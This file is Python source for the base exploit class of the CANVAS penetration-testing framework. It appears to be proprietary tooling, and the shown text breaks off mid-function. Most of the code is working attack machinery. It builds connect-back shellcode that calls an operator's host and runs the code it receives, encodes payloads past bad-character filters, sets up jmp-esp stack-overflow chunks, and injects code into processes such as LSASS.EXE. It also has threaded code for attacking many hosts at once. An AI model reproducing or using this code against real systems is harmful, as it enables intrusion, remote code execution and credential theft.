#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
canvasexploit class

This is the root class for all CANVAS exploits. It contains everything which ALL canvas exploits
need. In some cases this is shellcode creation libraries, but it's also socket creation and
storage of state for anything that is so generic all exploits use it. Most exploits derive from
this or the tcpexploit class.

"""


from hostlistener import hostlistener
from exploitutils import *
from gc import collect
import timeoutsocket
import canvasengine #for canvas_root_dir
import os, sys, time

# fix to be backwards compatible
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
    
from shellcode import shellcodeGenerator
from encoder import *
import random
from engine import CanvasConfig
from threading import Thread
import thread
import ThreadRunner2
from MOSDEF import mosdef
from exploitutils import intel_order
from libs.canvasos import canvasos
from MOSDEF import pelib 
from canvaserror import *
from shellcode import linuxshell
from shellcode import win32shell
from sniffer import sender #for can_scanrand()

import MOSDEFSock
            
def allowAddress(addr, addrlist):
    for a in range(0, 32, 8):
        tmp= (addr >> a) & 0xff
        if tmp in addrlist:
            return 0
    return 1

class _GeoIPutils:
    _gi_initialized = False
    _gi_list = None
    def getGeoIPlist(self):
        if not self._gi_initialized:
            if CanvasConfig['geoip']:
                try:
                    import GeoIP
                    self._gi_list = GeoIP.new(GeoIP.GEOIP_MEMORY_CACHE)
                except:
                    print "No GeoIP installed. Not enabling exclusion list."
                    self._gi_list = None
            self._gi_initialized = True
        return self._gi_list

import traceback
from random import randint

class ThreadRunner(Thread):
    """
    Used for threaded run on host
    """
    def __init__(self, target, parent):
        Thread.__init__(self)
        self.setDaemon(1)
        self.target=target
        self.parent=parent
        self.result=None
        self.check_for_life=False #if this is true, we check for life
    
    def enter(self):
        """A simple-psuedo-mutex"""
        self.parent.enter(thread_to_add_to_table=self, ip_to_add_to_table=self.target)
        
    def leave(self):
        """leave our mutex"""
        self.parent.leave(thread_to_remove_from_table=self.target)
        
    def suicide(self):
        """hook to allow parent to kill dead thread"""
        ###call exit routines in attack module ????
        #self.parent.setstate("halt") #syntax wrong
        thread.exit()
        
    def run(self):
        """
        Does a simple "mutex" to ensure we only use as many threads
        as we've set up in maxthreads
        """
        parent=self.parent
        host=self.target
        try:
            node=parent.argsDict["passednodes"][0]        
        except:
            #no node?
            print "ERROR: No node in ThreadRunner?"
            return 
        self.enter()  
        #we check to see if we already have a real target
        #or if it's a string (ip/hostname)
        #if it's aa string, and we have check_for_life of true,
        #we go ahead and scan for life, and if it's not alive, we
        #bail
        ret=0
        if type("")==type(host) and self.check_for_life:
            try:
                target=node.get_known_host(host)
                if not target:
                    self.parent.log("Looking for host %s"%host)
                    if not self.parent.checkAlive(host):
                        self.parent.log("Host %s not alive"%host)
                        self.leave()

                        return
                    self.target=node.new_host(host)
                ret=1
            except:
                ret=0
            if not ret:
                self.leave()
                return
            
        #if self.target is a string, we're going to assume it's alive
        #We don't add it to our list in this case because we have not
        #checked it for life. portsweep and other recon modules will
        #do that for us if it is alive
        if type("")==type(self.target):
            self.target=node.new_host(self.target,add=0)        
        #need to prevent an exception from causing our currentthreads to be ignored
        try:
            ret=self.parent.run_on_host(self.target)
        except:
            print "=================Exception caught by ThreadRunner======================="
            traceback.print_exc(file=sys.stdout)
            print "=================Exception caught by ThreadRunner======================="
            ret=0
            
        if ret not in [1,0,None]:
            parent.results+=[ret]
        self.leave()
        self.result=ret
        return ret
    
class canvasexploit(hostlistener, _GeoIPutils):
    # Add more 
    HALT= "halt"
    PAUSE="pause"
    #this is a list of things we can return in self.result_error
    ERR_COULD_NOT_CONNECT="Could not connect"
    ERR_FAILED="Failed"
    ERR_NO_SHELLCODE="Could not create a shellcode"
    ERR_NO_VERSION="Could not determine version to attack with"
    ERR_NO_LOGIN="Could not log in to remote service"
    SUCCESS="Success"
    
    CRASHED_UNKNOWN="Unknown"
    CRASHED_SERVICE="Service"
    CRASHED_HOST="Host"
    CRASHED_STILLALIVE="Still alive"
    
    def __init__(self):
        hostlistener.__init__(self)
        self.result_error=self.SUCCESS
        self.result=None
        #this is defined here so exploits can query it and
        #find out if they are running under autohack
        #in which case their test() can be quite agressive
        #This is most important for exploits, such as web exploits
        #that need to start a listener after they run test()
        #and can only find out what platform they are targeting
        #by exploiting their target and getting a uname -a
        #if silica, this is set to "silica" so we know how to behave
        self.autohack_state="aggressive"
        self.postactions=[] #actions to take when exploit is done
        self.remoteport=0
        self.logfunction=None
        self.debugfunction=None        
        self.succeeded=0
        self.InitString=""
        self.versions={}
        self.user=None
        self.password=None
        self.command=""
        self.host=None
        self.port=None
        self.mycanvasengine=None
        self.name="CANVAS Exploit"
        self.setInfo(self.name,showlog=0)
        self.state="starting"
        #our three main variables
        self.target=None
        self.callback=None
        self.argsDict={}
        self.argsDict["passednodes"]=[]
        self.supportedNodeArgs=[]
        self.listenerArgsDict={}
        self.version=1
        self.badstring=""
        #supportedNode is used for gettcpsock() and friends. This is a list of nodes that
        #can do socket operations, basically
        self.socketSupportedNode = ["linuxNode","win32Node", "solarisNode", "aixNode", "bsdNode","osxNode", "ScriptNode"]
        self.netmask = "32" # for self.run_on_all_*_hosts, WARNING: 32 and not /32
        self.randomizeSocketSource=1 #by default we randomize across all selected nodes!
        self.crashed_status=self.CRASHED_UNKNOWN
        self.force=0 #used to force exploits to run under all known hosts...
        ##Thread bits
        self.maxthreads=256
        self.currentthreads=0
        self.thread_table={} ##Table keyed on target ip, attributes of currently running thread ID
        self.thread_mutex=threading.RLock()
        self.rouge_thread_timeout=600  ##Time to wait in wait_for_threads() for threads to complete by
        
        
        self.pausenum = 1
        self.halt_children=[]
        self.loggedInformation=[] #all the information we have logged
        return
    
    def __getstate__(self):
        """
        Pickling routine
        """
        odict=self.__dict__.copy() #we modify a dict here
        banned_objects=["thread_mutex","engine","gui"]
        for banned in banned_objects:
            if banned in odict:
                del odict[banned]
        devlog("pickle", "Returning canvasexploit without thread_mutex")
        return odict
        
    class error(Exception):        
        def __init__(self, args=None):
            self.args = args                                                                                             
        def __str__(self):
            return `self.args`

    def raiseError(self, msg):
        raise self.error, msg
    
    def threadwait(self):
        """
        This function waits until our threadcount is small enough for us to continue
        """
        while (self.maxthreads<=self.currentthreads) and (not time.sleep(0.1) and self.maxthreads<=self.currentthreads) :
            sleeptime=float(randint(1,50))/25.0
            devlog("threads", "Enter sleeping %f seconds"%sleeptime)
            time.sleep(sleeptime)
        return self.maxthreads
    
    def enter(self, thread_to_add_to_table=None, ip_to_add_to_table=None):
        """Enter our psuedo-mutex"""
        done=0
        
        while not done:
            self.threadwait()
            self.thread_mutex.acquire()
            if self.maxthreads>self.currentthreads:
                done=1
            self.thread_mutex.release()
            
        self.thread_mutex.acquire()
        devlog("threads","canvasexploit::enter(%d/%d) %s"%(self.currentthreads,self.maxthreads,self.name))
        
        ##Add this into our thread_table to track where we still have threads running to
        if thread_to_add_to_table and ip_to_add_to_table:
            self.thread_table[ip_to_add_to_table]=thread_to_add_to_table
            
        self.currentthreads+=1
        self.thread_mutex.release()
        return
    
    def leave(self, thread_to_remove_from_table=None):
        self.thread_mutex.acquire()
        devlog("threads","canvasexploit::leave(%d) %s"%(self.currentthreads, self.name))
        self.currentthreads-=1
        
        if thread_to_remove_from_table:
            try:
                try:
                    del self.thread_table[thread_to_remove_from_table.interface]
                except AttributeError:
                    ##Find out which modules are out of compliance messing with self.target (it should alwyas be a host knowledge instance)
                    del self.thread_table[thread_to_remove_from_table]
            except KeyError:
                self.log("Trying to remove thread from table that is not there. Maybe a rouge thread woke up? [%s]"%(thread_to_remove_from_table.interface))
            
        self.thread_mutex.release()
        return
    
    def getState(self):
        return self.state

    def setState(self,state):
        self.state=state
        return self.state
   
    def pause(self):
        # For exploit development on commandline only
        self.log("[Press any key to continue #%d]" % self.pausenum)
        sys.stdin.read(1)
        self.pausenum += 1
 
    def setLogFunction(self,logfunction):
        self.logfunction=logfunction
        return
    
    def setDebugFunction(self, debugfunction):
        self.debugfunction=debugfunction
        return


    def do_data_view(self, col_title, data):
        """
        Method to call out to from the canvas modules to do the sexy data view stuff:
        
        IN: col_title - list of titles for columns 
            data      - list of data items to be applied to each column (for multiple columns, list of lists)
        """
        if hasattr(self,  "dataviewcolumnsfunction") and hasattr(self, "dataviewinfofunction"):
            self.DataViewColumns(col_title)
            c = []
    
            for d_row in data:
                c.append(d_row)
            self.DataViewInfo(c)
    
    def setDataViewColumnsFunction(self, dataviewcolumnsfunction):
        self.dataviewcolumnsfunction=dataviewcolumnsfunction
        return

    def DataViewColumns(self,args):
        self.dataviewcolumnsfunction(args)
        return

    def setDataViewInfoFunction(self, dataviewinfofunction):
        self.dataviewinfofunction=dataviewinfofunction
        return

    def DataViewInfo(self,args):
        self.dataviewinfofunction(args)
        return

    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def getarg(self, argname):
        """
        getarg is used in the self.getArgs() function to get a single
        string argument
        self.getarg("user") is the same as:
        self.user=self.argsDict.get("user",self.user)
        """
        #this little bit covers the case where it's an integer argument and we passed in a "1"
        settoint=False 
        if hasattr(self, argname):
            if type(getattr(self, argname) ) in [type(1)]:
                settoint=True
        if self.argsDict.get(argname)==None:
            return getattr(self, argname) #no change
        
        #could really do this more cleanly with setattr and getattr
        code="self.%s=self.argsDict.get(\"%s\",self.%s)"%(argname,argname,argname)
        exec(code)
        
        if settoint:
            setattr(self, argname, int(getattr(self, argname)))
        
        return getattr(self, argname)
    
    def debuglog(self, message, color="black", enter="\n"):
        """
        Might be run in the thread context of an exploit, and not in the gui thread context
        """
        if self.debugfunction==None:
            sys.stdout.write("[debug] " + str(message) + enter)
            #print  "[debug] "+ message
        else:
            # self.name/self.id would be erased at one point
            message="%s [%d]: %s"%(self.name, self.id, message)
            self.debugfunction(message, color, enter="\n")
        
    def set_command(self,command):
        self.command=command

    def set_user(self, user):
        self.user = user

    def get_user(self):
        return self.user
    
    def set_password(self, password):
        self.password = password

    def get_password(self):
        return self.password

    def halt(self, blacklist=None):
        """
        Sets my state to halt, as well as all my children
        CANNOT BLOCK as this will be done in the main thread
        """
        if blacklist==None:
            blacklist={}
        if blacklist.get(self):
            return 
        blacklist[self]=True 
        
        self.setState(self.HALT)
        for child in self.children:
            child.halt(blacklist=blacklist)
        for child in self.halt_children:
            #these are objects that support halt, but are not otherwise children. Real children are
            #also touched by gui code, etc.
            child.halt()
        self.halt_children=[] #reset this. These are gone now. 
        self.log("%s set state to halt"%self.name)
        return 
    
    def getpipe(self,pipename):
        "gets a named pipe locally"
        pipenode=self.argsDict["passednodes"][0]
        if pipenode.nodetype in ["LocalNode"]:
            if os.name=="posix":
                #cygwin/linux
                self.log("Cannot open named pipes locally on this Python...are you using Cygwin instead of native Python?")
                return 0
            elif os.name=="nt":
                #on win32, with native Python, just open one up
                from localPipe import localPipe
                fd=localPipe(pipename)
                
        elif "win32api" in pipenode.capabilities:
            #TO FIX WITH SOME SORT OF OBJECT
            from localPipe import MOSDEFPipe
            fd=MOSDEFPipe(pipenode.shell)
            ret=fd.open(pipename)
            if ret==-1:
                return 0
        else:
            self.log("Nodetype %s not supported for getpipe()"%pipenode.nodetype)
            self.log("capabilities: %s"%pipenode.capabilities)
            return 0
        return fd
    
    def getrawsock(self):
        """only for linuxNode at the moment"""
        s=None
        socknode=self.argsDict['passednodes'][0]
        if socknode.nodetype in ['linuxNode']:
            s=MOSDEFSock.MOSDEFSock(-1,socknode.shell,proto='raw')
            devlog('canvasexploit','Got remote RAW socket object')
        return s

    def getudpsock(self, AF_INET6=0):
        """we assume the first node in the list is the node we want to create
        a socket object with"""
        s=None
        socknode=self.argsDict["passednodes"][0]
        if socknode.nodetype in ["LocalNode"]:
            if AF_INET6:
                s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif socknode.nodetype in self.socketSupportedNode:
            s = MOSDEFSock.MOSDEFSock(-1, socknode.shell, proto="udp")
            devlog("canvasexploit","Got remote UDP socket object")
            
        return s
    
    def gettcpsock(self,socknode=None, noipv6=0, AF_INET6=0):
        """we assume the first node in the list is the node we want to create
        a socket object with unless self.randomizeSocketSource is set - in which
        case we return a socket from a random node

        We return a socket on success and None on error (no valid nodes found)
    
        """
            
        if not socknode:
            if self.randomizeSocketSource:
                #if randomize is set, we pick a random node from our passednodes, and create our
                #tcp socket on that
                allnodes=self.argsDict["passednodes"]
                if allnodes==[]:
                    #we need at least one node here...
                    devlog("ERROR: canvasexploit  got passed a zero length node list ")
                #Only uncomment this when things are going badly
                #devlog("canvasexploit","Length of allnodes=%d"%len(allnodes))
                while socknode==None:
                    nodenum=random.randint(0,len(allnodes)-1)
                    socknode=allnodes[nodenum]
                    if socknode.nodetype not in (["LocalNode"]+self.socketSupportedNode):
                        socknode=None #we can't use this node. Perhaps it's here for some other reason?
            else:
                socknode=self.argsDict["passednodes"][0]
            if socknode==None:
                devlog("Error: Socknode is none in canvasexploit::gettcpsock")
        if socknode.nodetype in ["LocalNode"]:

            # XXX: only localnode ipv6 support for beta linux/windows
            # XXX: this will require minimal porting of attacks to ipv6 if
            # XXX: we lack access to self.callback here
            
            # try being transparent for switching into IPv6 connects
            # have the notipv6 control for situations where you want a tcp sock
            # to a non ipv6 addie inside an ipv6 exploit.            

# NOTES ON GETTING SCOPE ID FOR LINK LOCAL ADDIES (mostly used in discovery protocols, dhcp etc.)
#>>> res = socket.getaddrinfo("fe80::20c:29ff:fe8d:f629", 5001, socket.AF_INET6, socket.SOCK_STREAM)
#>>> print res[0][4]
#('fe80::20c:29ff:fe8d:f629', 5001, 0, 0)
#>>> 

            # XXX: try and both be transparent, and flexible .. oi vey

            if (self.target != None and not noipv6 and ":" in str(self.target.interface)) or AF_INET6:
                if AF_INET6: # only show it on explicit requests
                    print "[!] switching socket mode to AF_INET6 ..."
                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        elif socknode.nodetype in self.socketSupportedNode:

            s = MOSDEFSock.MOSDEFSock(-1, socknode.shell)
            print "Got remote socket object"
        else:
            devlog("ERROR: Got the wrong kind of node in gettcpsock()!")
            s=None
            
        return s
    
    def gettcplistener(self, listenport, listenhost = None, timeout=5.0):
        # XXX: do we need to be able to set the "::" ipv6 equiv here? how
        # XXX: common is it to not have a listenhost set ?

        if not listenhost or listenhost == "":
            devlog('gettcplistener', "listenhost not set, setting to 0.0.0.0")
            listenhost = "0.0.0.0"

        # transparant ipv6 support based on binding interface, see "::" possible issue        
        ipv6 = 0
        if ":" in str(listenhost):
            ipv6 = 1

        devlog('gettcplistener', "binding on %s:%d" % (listenhost, listenport))

        socknode=self.argsDict["passednodes"][0]
        if socknode.nodetype in ["LocalNode"]:
            if ipv6:
                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        elif socknode.nodetype in self.socketSupportedNode:
            # XXX: ipv6 warning for now
            if ipv6:
                print "[!] CANT BIND IPV6 ON REMOTE NODES FOR NOW"
                return None
            else:
                import MOSDEFSock
                s = MOSDEFSock.MOSDEFSock(-1, socknode.shell)
                print "Got remote socket object"

        try:
            s.bind((listenhost,listenport))
        except socket.error, msg:
            s.close()
            self.log("Could not listen on that host:port: %s:%d - %s"%(listenhost,listenport,msg))
            #import traceback
            #traceback.print_exc()
            return None

        # XXX: for ipv6 transparency, not set_timeout capable on sockets
        try:
            s.set_timeout(timeout) #accept for 5 seconds before timeout
        except:
            pass

        s.listen(5)
        return s
    
    def isactive(self,sock):
        """is a socket active?"""
        import select
        socknode=self.argsDict.get("passednodes",[None])[0]
        if socknode==None or socknode.nodetype in ["LocalNode"]:
            rd, wr, ex = select.select([sock], [], [], 10)
        elif socknode.nodetype in self.socketSupportedNode:
            rd = sock.isactive()
        return rd

    def ISucceeded(self):
        """Checks to see if a callback has come back for us. If it has,
        return 1, else 0.
        
        If this is a remote node's responsibility, then the remote node
        will get accept() called on it, and will return if it was successful
        in spawning a new node
        """
        print "Checking to see if I succeeded"
        sys.stdout.flush()
        if self.succeeded:
            return 1
        if self.engine:
            if self.callback:
                try:
                    parentnode=self.callback.parent.parent.parent
                except AttributeError:
                    #we are a fake listener line - which means we are running from the commandline...
                    try:

                        listenername=os.path.join(canvasengine.canvas_root_directory,"listener-%s" % str(self.remoteport))
                        os.stat(listenername)
                        return 1
                    except:
                        return 0
                #gui...
                if not parentnode:
                    return self.succeeded
                type=parentnode.nodetype
                if type=="LocalNode":
                    return self.succeeded
                elif type in self.socketSupportedNode:
                    #MOSDEF nodes need to go call accept() and see if it
                    #worked. These sockets are set to nonblocking so they'll
                    #return immediately if nothing is listening
                    #if something is listening they'll set up the new shellserver Node
                    #and return 1
                    #callback is of class listenerLine, btw.
                    self.log("Checking callback to see if we got a connection.")
                    ret=self.callback.check() #will add new node if one is found!
                    #check twice

                    ret2=ret
                    while ret2:
                        self.log("Checking callback to see if we got a connection (try2).")
                        time.sleep(0.4)
                        ret2=self.callback.check() #will add new node if one is found!
                        print "Ret2=%s"%ret2
                        sys.stdout.flush()
                    #ret is a socket, socket wrapper type or None
                    for r in [ret,ret2]:
                        if r not in [None,0,-1,uint32(-1)]:
                            self.succeeded=1
                else:
                    print "Unknown type of listener..."
                    sys.stdout.flush()
            return self.succeeded
        else: 
            try:
                # for future using commandline...
                os.stat("listener-%s" % str(self.remoteport))
                return 1
            except OSError:
                return 0
            

    def setSucceeded(self):
        self.succeeded=1
        self.setProgress(100)
        return

    def setHelperHost(self, host):
        self.helperhost = host
        return    
    
    def neededListenerTypes(self):
        return []
        
    def setVersion(self,version):
        self.version=version
        return
    
    #just a placekeeper
    def createShellcode(self):
        return "A"
    
    def test(self):
        """Default action of test is to return not vulnerable,
        so the scanner can ignore modules which have no test defined
        
        In this base class, we return None instead of zero, this allows you to 
        differentiate (if you so choose) between "test not defined" (None) and "test failed" (0)
        
        test() is also responsible for setting self.version
        """
        return None
    
    
    def setHost(self,host):
        self.host=host
        return
    
    def createFreeBSDCallbackShellcode(self,host,port):
        """
        Creates a shellcode to call back to a FreeBSD MOSDEF Node
        """
        sc = shellcodeGenerator.bsd_X86()
        sc.addAttr("setuid",None)
        sc.addAttr("setreuid",None)
        sc.addAttr("connect",{"ipaddress": host, "port": port})
        sc.addAttr("read_and_exec",None)
        self.shellcode = sc.get()
        if self.badstring:
            #only encode if we have to
            encoder = chunkedaddencoder.intelchunkedaddencoder()
            encoder.setbadstring(self.badstring)
            self.log("Encoding shellcode")
            self.shellcode = encoder.encode(self.shellcode)

            if self.shellcode == "":
                raise Exception, "Could not encode shellcode!"
        return self.shellcode

    
    def createWin32SearchShellcode(self,localhost,localport,rawshellcode=None,subesp=None, debug=False):
        """
        Creates a mosdef search shellcode
        you can specify a raw shellcode to use or a value to subtract from esp before the decoding is done (of the search shellcode)
        (you'll want to use a value that is %4 so winsock doesn't die)
        """

        #print "Calling back to %s:%s"%(localhost,localport)
        #print "Rawshellcode=%s"%rawshellcode
        ret=self.createWin32Shellcode(self.badstring,localhost,localport,rawshellcode)

        if not ret:
            return ret
        #we're going to  search for it, so we add tag1 and tag2 to the front.
        #Tag2 must come before tag1!!!
        if debug:
            self.shellcode= "\xcc"+self.shellcode
        #get random tag1 and tag2 for when you run this twice
        self.tag1 = chr(random.randint(41,61)) + chr(random.randint(41,61)) + chr(random.randint(41,61)) + chr(random.randint(41,61))
        self.tag2 = chr(random.randint(41,61)) + chr(random.randint(41,61)) + chr(random.randint(41,61)) + chr(random.randint(41,61))
        self.log("Tag1: %s Tag2: %s"%(self.tag1, self.tag2))
        self.shellcode=self.tag2+self.tag1+self.shellcode
        
        self.searchcode=win32shell.getsearchcode(self.tag1,self.tag2)
        print "Searchcode length: %d"%len(self.searchcode)
        self.encodedsearchcode=self.intel_encode(self.searchbadstring, self.searchcode)
        
        #now do our subesp if asked to do so...
        if subesp:
            self.encodedsearchcode=mosdef.assemble("add $-%d, %%esp"%subesp,"X86")+self.encodedsearchcode

        #self.searchcode=win32shell.getsearchcode(self.tag1,self.tag2)
        self.log("Length of search shellcode: %d, length of real shellcode: %d\n"%(len(self.searchcode), len(self.shellcode)))
        #print prettyprint(self.encodedsearchcode)
        for c in self.badstring:
            if c in self.encodedsearchcode:
                self.log("%s in encodedsearchcode. :<"%prettyprint(c))
                self.log("%s"%prettyprint(self.encodedsearchcode))  
        return 1
        
    def createSparcShellcode(self, badstring, localhost,localport,rawshellcode=""):
        if rawshellcode in ["",None]:
            print "Generating typical sparc shellcode"
            sc=shellcodeGenerator.solarisSparc()
            #solaris
            #sc.addAttr("subsp",[1000])
            sc.addAttr("connect",{"ipaddress": localhost, "port": localport})
            sc.addAttr("RecvExec",None)
            rawshellcode=sc.get()
        #new encoder setup
        encoder=addencoder.sparcaddencoder()
        #these are the characters not allowed by the exploit
        encoder.setbadstring(badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        self.shellcode=shellcode
        print "Created shellcode - len=%d"%(len(shellcode))
        return 1

    def addjmpesp(self,eiploc,eip,addesp):
        """
        This function is useful for exploits which need to return using
        a jmpesp (basic stack overflow technique) but for which for some reason
        the retloc is actually within the shellcode. So we first encode the shellcode 
        to avoid bad chars, then "chunk" it with another simple encoder (which
        hopefully passes the filter).
        """
        from exploitutils import intel_order
        shellsize=len(self.shellcode)+20 #fluff
        #-4 for len(eip) -5 for len(jmpback)
        jmpback=mosdef.assemble("jmp $%s\n"%(-eiploc-4-5),"X86") #code to jump backwards        
        chunksize=len(jmpback)+4 #4 for eip
        done=0
        chunkbin=""
        while done!=1:
            chunktry=eiploc-len(chunkbin)
            chunker=shellcodeGenerator.X86()
            if addesp!=0:
                chunker.addAttr("addesp",[addesp])
            chunker.addAttr("one_chunkize",{"chunkloc": chunktry, 
                                            "chunksize": chunksize, 
                                            "shellsize": shellsize, 
                                            "badstring": self.badstring})
            chunkbin=chunker.get()        
            self.log("Notice: chunker length was %d, chunktry: %d"%(len(chunkbin),chunktry))
            if chunktry+len(chunkbin)==eiploc:
                done=1
                
        chunkloc=eiploc-len(chunkbin)
        self.log("Length of chunker is %d"%len(chunkbin))
        self.shellcode2=""
        self.shellcode2+=chunkbin+self.shellcode[:chunkloc]+intel_order(eip)+jmpback
        self.shellcode2+=self.shellcode[chunkloc:]
        self.shellcode=self.shellcode2
        for a in self.badstring:
            if a in self.shellcode:
                self.log("Could not encode shellcode. Found %s in string!"%prettyprint(a))
                self.log("Chunker=%s"%prettyprint(chunkbin))
                return 0
        return 1

    def createMessageBoxShellcode(self):
        """
        This createShellcode displays a message when
        the exploit is successful
        """
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", None)
        sc.addAttr("MessageBeep", None)
        sc.addAttr("MessageBox", ["HELLO"])
        #sc.addAttr("MessageBox", ["HOW ARE YOU?"])
        sc.addAttr("ExitProcess", None)
        self.shellcode = sc.get()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return self.shellcode

    def createHeapSafeInject(self, badstring, localhost, localport, injectme="",setdebugprivs=0):
        if injectme in ["", None]:
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0x1000 }) 
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
            sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            #sc.addAttr("RecvExecWin32", {"socketreg": "FDSPOT"})
            sc.addAttr("ExitThread", None)

            self.callback.argsDict["fromcreatethread"] = 1
            injectme = sc.get()
        #    print "Dumping InjectMe Code:" + sc.getcode()

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("HeapSafeInject", { "injectme" : injectme, "setdebugprivs" : setdebugprivs })
        sc.addAttr("ExitThread", None)
        injectcode = sc.get()

        #print "Dumping HeapSafeInject Code:" + sc.getcode()

        rawshellcode = injectcode

        if badstring=="":
            self.shellcode=rawshellcode
            return rawshellcode

        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)         
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            raise "ErrorEncodingShellcode"
        self.setShellcode(shellcode)
        
        return shellcode

    def createInjectToSelf(self, localhost, localport, injectme="", vProtect=False, movetostack=False):
        """
        Returns the shellcode, but not encoded, and does not set
        self.shellcode
        """
        if injectme in ["", None]:
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            sc.addAttr("RecvExecDepSafe",None) #MOSDEF
            sc.addAttr("ExitThread",None)
            self.callback.argsDict["fromcreatethread"] = 0
            injectme = sc.get()
        sc = shellcodeGenerator.win32()
        sc.vProtectSelf=vProtect
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("InjectToSelf", { "injectme" : injectme })
        sc.addAttr("ExitThread", None)
        shellcode=sc.get()
        if movetostack:
            sc = shellcodeGenerator.win32()
            sc.standalone = 1
            sc.addAttr("moveToStack", { "Length":len(shellcode) })
            shellcode = sc.get() + shellcode
        return shellcode
        

    # note that process name is case sensitive!
    def createHeapSafeInjectIntoProcess(self, badstring, localhost, localport, injectme="", smallcode=0, processname="LSASS.EXE", backupprocess="lsass.exe", append=None, revert=0):
        if injectme in ["", None] and not smallcode:
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0x1000 }) 
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            if localhost == "0.0.0.0":
                sc.addAttr("BindMosdef", {"port" : localport})
                sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            else:
                sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
                sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread", None)
        
            self.callback.argsDict["fromcreatethread"] = 1
            injectme = sc.get()
        else:
            self.callback.argsDict["fromcreatethread"] = 0

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval": 0})
        self.log("Using process: %s"% processname)

        if revert:
            # if you revert, the function table changes too !!!
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)

        if smallcode: # smallcode means we use the custom injectme code which uses a function addresses block transfer
            if append:
                sc.addAttr("OrigamiInject", { "ipaddress" : localhost, "port" : localport, \
                            "processname" : processname, "append" : append, "revert" : revert, "backupprocess" : backupprocess})
            else:
                sc.addAttr("OrigamiInject", { "ipaddress" : localhost, "port" : localport, "processname" : processname, \
                            "revert" : revert, "backupprocess" : backupprocess })
        else:
            if append:
                sc.addAttr("OrigamiInject", { "ipaddress" : localhost, "port" : localport, "injectme" : injectme, \
                            "revert" : revert, "processname" : processname, "append" : append, "backupprocess" : backupprocess })
                sc.addAttr("ExitThread", None)
            else:
                sc.addAttr("OrigamiInject", { "ipaddress" : localhost, "port" : localport, "injectme" : injectme, \
                            "revert" : revert, "processname" : processname, "backupprocess" : backupprocess })
                sc.addAttr("ExitThread", None)

        injectcode = sc.get()

        #print "Dumping HeapSafeInject Code:" + sc.getcode()

        rawshellcode = injectcode

        if badstring == "":
            self.shellcode = rawshellcode
            return rawshellcode

        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode = encoder.encode(rawshellcode)         
        self.log( "Done encoding shellcode.")
        if shellcode == "":
            self.log( "Could not encode shellcode")
            raise "ErrorEncodingShellcode"
        self.setShellcode(shellcode)

        return shellcode
    
    def easychunk(self,chunkloc,chunksize,subesp):
        """
        Similar to the addespchunk, but less hand-holding
        
        This is a bit tricky to get right - it should handle everything for you
        but if you detect an error in your shellcode, most likely at the end
        where ws2_32.dll is getting cut off, then you need to tell one_chunkize
        to encode MORE of your shellcode, and I probably need to revisit every
        exploit that uses this...
        
        """
    
        shellsize=len(self.shellcode) #+chunksize+40 #fluff to make this work. Should this be larger?
        done=0
        chunkbin=""
        eiploc=chunkloc
        while done!=1:
            chunktry=eiploc-len(chunkbin)
            chunker=shellcodeGenerator.X86()
            if subesp!=0:
                chunker.addAttr("subesp",[subesp,self.badstring])
            chunker.addAttr("one_chunkize",{"chunkloc": chunktry, 
                                            "chunksize": chunksize, 
                                            "shellsize": shellsize, 
                                            "badstring": self.badstring})
            chunkbin=chunker.get()        
            self.log("Notice: chunker length was %d, chunktry: %d"%(len(chunkbin),chunktry))
            if chunktry+len(chunkbin)==chunkloc:
                done=1
                
        chunkloc=chunkloc-len(chunkbin)
        self.log("Length of chunker is %d"%len(chunkbin))
